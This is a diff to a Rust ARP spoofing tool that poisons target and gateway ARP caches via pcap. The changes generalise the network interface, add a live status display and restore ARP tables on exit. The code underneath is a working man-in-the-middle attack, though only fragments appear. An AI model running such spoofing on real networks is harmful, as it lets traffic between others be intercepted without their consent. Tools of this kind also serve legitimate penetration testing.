@@ -33,11 +33,11 @@ pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gatew
             .open()?
     ));
 
-    let gateway_mac = get_mac(&mut cap.lock().unwrap(), gateway_ip)?;
+    let gateway_mac = get_mac(&mut cap.lock().unwrap(), interface_name, gateway_ip)?;
 
     let mut target_list = Vec::new();
     for target_ip in target_ips {
-        let target_mac = get_mac(&mut cap.lock().unwrap(), target_ip)?;
+        let target_mac = get_mac(&mut cap.lock().unwrap(), interface_name, target_ip)?;
         target_list.push(Target {
             ip: target_ip,
             mac: target_mac,
@@ -46,6 +46,7 @@ pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gatew
         });
     }
 
+    // Print initial target info
     for target in &target_list {
         println!("[*] Spoofing target: {}", target.ip);
         println!("    |- Target MAC: {}", mac_to_string(&target.mac));
@@ -54,8 +55,11 @@ pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gatew
 
     let cap_clone = Arc::clone(&cap);
     let targets_clone = target_list.clone();
+
     ctrlc::set_handler(move || {
-        println!("\n[*] Restoring ARP tables...");
+        // Move cursor to new line before printing restore message
+        println!("\n");
+        println!("[*] Restoring ARP tables...");
         let mut cap = cap_clone.lock().unwrap();
         for target in &targets_clone {
             restore_arp(&mut cap, target.ip, target.gateway_ip, 
@@ -64,6 +68,7 @@ pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gatew
         process::exit(0);
     }).expect("Error setting Ctrl+C handler");
 
+    let mut first_status_run = true;
     loop {
         let mut cap = cap.lock().unwrap();
         for target in &target_list {
@@ -77,6 +82,10 @@ pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gatew
             )?;
         }
         drop(cap);
+        
+        // Update and print status display
+        print_statuses(&target_list, &mut first_status_run);
+        
         thread::sleep(Duration::from_secs(2));
     }
 }
@@ -124,10 +133,6 @@ fn send_arp(cap: &mut Capture<pcap::Active>,
 
     cap.sendpacket(&*packet)?;
 
-    if let ArpOp::Reply = op {
-        println!("[+] Sent ARP reply to {} claiming {}", dst_ip, src_ip);
-    }
-
     Ok(())
 }
 
@@ -143,9 +148,13 @@ fn restore_arp(cap: &mut Capture<pcap::Active>,
     Ok(())
 }
 
-fn get_mac(cap: &mut Capture<pcap::Active>, ip: Ipv4Addr) -> Result<[u8; 6], Error> {
-    let our_mac = get_interface_mac("wlo1")?;
-    let our_ip = get_interface_ip("wlo1")?;
+fn get_mac(
+    cap: &mut Capture<pcap::Active>,
+    iface: &str,
+    ip: Ipv4Addr,
+) -> Result<[u8; 6], Error> {
+    let our_mac = get_interface_mac(iface)?;
+    let our_ip = get_interface_ip(iface)?;
 
     send_arp(cap, ArpOp::Request, our_mac, our_ip, [0xff; 6], ip)?;
 
@@ -196,4 +205,20 @@ fn mac_to_string(mac: &[u8; 6]) -> String {
         "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
         mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
     )
+}
+
+fn print_statuses(targets: &[Target], first_run: &mut bool) {
+    let num_targets = targets.len();
+    
+    // Move cursor up on subsequent runs
+    if !*first_run {
+        print!("\x1B[{}A", num_targets); // Move up N lines
+    } else {
+        *first_run = false;
+    }
+    
+    // Print fresh status lines
+    for target in targets {
+        println!("[+] Target {:15} : Active", target.ip);
+    }
 }
